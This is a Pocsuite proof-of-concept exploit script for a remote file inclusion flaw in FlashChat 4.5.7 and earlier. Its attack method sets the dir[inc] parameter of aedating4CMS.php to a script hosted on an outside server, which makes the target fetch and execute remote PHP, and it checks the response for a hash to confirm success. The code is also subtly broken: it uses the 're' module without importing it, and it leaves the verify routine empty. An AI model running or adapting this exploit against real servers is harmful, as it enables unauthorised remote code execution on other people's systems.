#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '63921'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2006-09-06'
    createDate = '2015-11-16'
    updateDate = '2015-11-16'
    references = ['http://www.sebug.net/vuldb/ssvid-63921']
    name = 'FlashChat &lt;= 4.5.7 (aedating4CMS.php) Remote File Include Vulnerability'
    appPowerLink = 'N/A'
    appName = 'FlashChat'
    appVersion = '<=4.5.7'
    vulType = 'Other'
    desc = '''
        FlashChat在处理用户请求时存在输入验证漏洞，远程攻击者可能利用此漏洞以Web进程权限执行任意命令。
        FlashChat的/inc/cmses/aedating4CMS.php、/inc/cmses/aedatingCMS.php和/inc/cmses/aedatingCMS2.php脚本
        没有正确验证dir[inc]变量用户输入，远程攻击者通过包含本地或外部资源的任意文件导致执行任意脚本代码。
    '''
    samples = ['']

    def _attack(self):
        result = {}
        
        #远程文件内容是<?php echo md5('3.1416');?>
        payload='http://tool.scanv.com/wsl/php_verify.txt?'
        #漏洞测试地址
        expUrl='{url}/inc/cmses/aedating4CMS.php?dir[inc]={py}'.format(url=self.url,py=payload)     
        try:
            response=req.get(expUrl, headers=self.headers, timeout=50)
            match = re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', response.content)
            if match:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = expUrl
            else:
                result={}
        except:
            result={}
        return self.parse_output(result)

    def _verify(self):
        result = {}
        #Write your code here

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)